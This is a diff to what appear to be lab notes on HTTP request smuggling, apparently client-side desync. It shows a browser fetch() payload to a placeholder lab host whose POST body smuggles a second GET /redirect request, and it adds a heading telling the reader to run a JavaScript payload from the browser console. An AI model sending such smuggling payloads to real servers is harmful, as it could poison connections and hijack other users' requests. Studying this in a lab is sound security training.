@@ -11,3 +11,6 @@
 ### Straightforward payload example:
 
 fetch('http://MACHINE_IP:5000/', {    method: 'POST',    body: 'GET /redirect HTTP/1.1\r\nFoo: x',    mode: 'cors',})
+
+### Write this JavaScript Payload in your browser command line that you can write JS
+
